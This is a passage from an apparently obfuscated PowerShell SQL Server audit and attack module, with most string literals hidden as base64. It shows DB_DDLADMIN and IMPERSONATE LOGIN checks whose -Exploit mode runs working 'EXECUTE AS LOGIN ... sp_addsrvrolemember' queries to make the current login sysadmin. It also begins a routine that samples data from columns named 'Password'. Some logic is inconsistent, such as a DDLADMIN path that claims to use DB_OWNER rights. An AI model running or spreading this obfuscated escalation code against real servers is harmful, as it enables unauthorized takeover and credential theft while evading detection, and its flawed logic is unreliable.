                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditRoleDbDdlAdmin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        $CurrentLoginRoles | % -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBEAEQATABBAEQATQBJAE4A')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHQAaABlACAARABCAF8ARABEAEwAQQBEAE0ASQBOACAAcgBvAGwAZQAgAGkAbgAgAG8AbgBlACAAbwByACAAbQBvAHIAZQAgAGQAYQB0AGEAYgBhAHMAZQBzAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAHQAaABlACAAbABvAGcAaQBuACAAdABvACAAZQBzAGMAYQBsAGEAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHQAbwAgAHMAeQBzAGEAZABtAGkAbgAgAGkAZgAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABhAHIAZQAgAHQAcgB1AHMAdABlAGQAIABhAG4AZAAgAG8AdwBuAGUAZAAgAGIAeQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALAAgAG8AcgAgAGkAZgAgAGEAIABjAHUAcwB0AG8AbQAgAGEAcwBzAGUAbQBiAGwAeQAgAGMAYQBuACAAYgBlACAAbABvAGEAZABlAGQALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABFAFgARQBDACAAcwBwAF8AYQBkAGQAcgBvAGwAZQBtAGUAbQBiAGUAcgAgACcARABCAF8ARABEAEwAQQBEAE0ASQBOACcALAAgACcATQB5AEQAYgBVAHMAZQByACcALAAgAGEAbgBkACAAYwBhAG4AIABiAGUAIAByAGUAbQBvAHYAZQBkACAAdwBpAHQAaAAgAGEAIABjAG8AbQBtAGEAbgBkACAAbABpAGsAZQA6ACAAIABFAFgARQBDACAAcwBwAF8AZAByAG8AcAByAG8AbABlAG0AZQBtAGIAZQByACAAJwBEAEIAXwBEAEQATABBAEQATQBJAE4AJwAsACAAJwBNAHkARABiAFUAcwBlAHIAJwA=')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZQB4AHAAbABvAGkAdAAgAGMAbwBtAG0AYQBuAGQAIABpAHMAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGEAdAAgAHQAaABpAHMAIAB0AGkAbQBlACwAIABiAHUAdAAgAGEAIABjAHUAcwB0AG8AbQAgAGEAcwBzAGUAcwBtAGIAbAB5ACAAYwBvAHUAbABkACAAYgBlACAAdQBzAGUAZAAuAA==')))
        $Details       = ''
        $Dependancies  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABtAHUAcwB0ACAAYgBlACAAbwB3AG4AZQBkACAAYgB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAgAGEAbgBkACAAYgBlACAAdAByAHUAcwB0AGUAZAAuACAATwByACAAaQB0ACAAbQB1AHMAdAAgAGIAZQAgAHAAbwBzAHMAaQBiAGwAZQAgAHQAbwAgAGwAbwBhAGQAIABhACAAYwB1AHMAdABvAG0AIABhAHMAcwBlAG0AYgBsAHkAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAZgBvAHIAIABlAHgAdABlAHIAbgBhAGwAIABhAGMAYwBlAHMAcwAuAA==')))
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHQAZQBjAGgAbgBlAHQALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOQA2ADEAMgAoAHYAPQBzAHEAbAAuADEAMAA1ACkALgBhAHMAcAB4AA==')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $CurrentPrincpalList|
        % -Process {
            $DBDDLADMIN = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose
            if($DBDDLADMIN)
            {
                $DBDDLADMIN|
                % -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName
                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                    $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | ? -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }
                    if($Depends)
                    {
                        $IsExploitable = 'No'
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
                        if($Exploit)
                        {
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -eq 0)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                }
                                else
                                {
                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivImpersonateLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUAIABMAG8AZwBpAG4A')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAHUAcgByAGUAbgB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGwAbwBnAGkAbgAgAGMAYQBuACAAaQBtAHAAZQByAHMAbwBuAGEAdABlACAAbwB0AGgAZQByACAAbABvAGcAaQBuAHMALgAgACAAVABoAGkAcwAgAG0AYQB5ACAAYQBsAGwAbwB3ACAAYQBuACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAGwAbwBnAGkAbgAgAHQAbwAgAGcAYQBpAG4AIABhAGQAZABpAHQAaQBvAG4AYQBsACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA==')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAYQBuACAAYQBsAHQAZQByAGEAdABpAHYAZQAgAHQAbwAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABzAHUAYwBoACAAYQBzACAAcwBpAGcAbgBlAGQAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMALgAgAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABpAHMAIABlAG4AYQBiAGwAZQBkACAAdQBzAGkAbgBnACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABHAFIAQQBOAFQAIABJAE0AUABFAFIAUwBPAE4AQQBUAEUAIABPAE4AIABMAG8AZwBpAG4AOgA6AHMAYQAgAHQAbwAgAFsAdQBzAGUAcgBdAC4AIABJAHQAIABjAGEAbgAgAGIAZQAgAHIAZQBtAG8AdgBlAGQAIAB1AHMAaQBuAGcAIABhACAAYwBvAG0AbQBhAG4AZAAgAGwAaQBrAGUAOgAgAFIARQBWAE8ASwBFACAASQBNAFAARQBSAFMATwBOAEEAVABFACAATwBOACAATABvAGcAaQBuADoAOgBzAGEAIAB0AG8AIABbAHUAcwBlAHIAXQA=')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAMQAzADYAMgAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $ImpersonationList = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.PermissionName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAFAARQBSAFMATwBOAEEAVABFAA==')))
        }
        if($ImpersonationList)
        {
            Write-Verbose -Message "$Instance : - Logins can be impersonated."
            $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $ImpersonationList |
            % -Process {
                $ImpersonatedLogin = $_.ObjectName
                $GranteeName = $_.GranteeName
                $ImpLoginSysadminStatus = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                If($ImpLoginSysadminStatus -eq 1)
                {
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin sysadmin login."
                    $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin SYSADMIN login. This test was ran with the $CurrentLogin login."
                    if($Exploit)
                    {
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting exploit process..."
                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                        if($SysadminPreCheck -eq 0)
                        {
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose
                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if($SysadminPostCheck -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
                            $Exploited = 'No'
                        }
                    }
                }
                else
                {
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin)."
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin). This test was ran with the $CurrentLogin login."
                    $IsExploitable = 'No'
                }
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No logins could be impersonated."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditSampleDataByColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = ' Column name to search for.')]
        [string]$Keyword = 'Password'
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
            Return
        }
        else
        {
